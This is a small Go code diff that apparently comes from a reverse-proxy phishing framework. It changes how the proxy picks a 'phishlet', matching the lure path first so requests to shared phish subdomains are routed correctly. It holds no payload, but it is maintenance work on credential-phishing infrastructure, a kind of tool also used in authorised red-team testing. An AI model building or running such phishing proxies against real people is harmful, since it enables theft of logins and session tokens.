@@ -340,6 +340,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
             phishDomain, phished := p.getPhishDomain(req.Host)
             if phished {
+                // Lure-first resolution: if the request path matches a known lure,
+                // the lure's phishlet takes precedence over the hostname-based
+                // resolution. This prevents mis-routing when multiple phishlets
+                // share the same phish subdomain (Go map iteration is random).
+                if _, lurePl, lerr := p.cfg.FindLureByPath(o_host, req_path); lerr == nil {
+                    if pl == nil || pl.Name != lurePl.Name {
+                        pl = lurePl
+                        if d, dok := p.cfg.GetSiteDomain(lurePl.Name); dok {
+                            phishDomain = d
+                        }
+                    }
+                }
+
                 pl_name := ""
                 if pl != nil {
                     pl_name = pl.Name
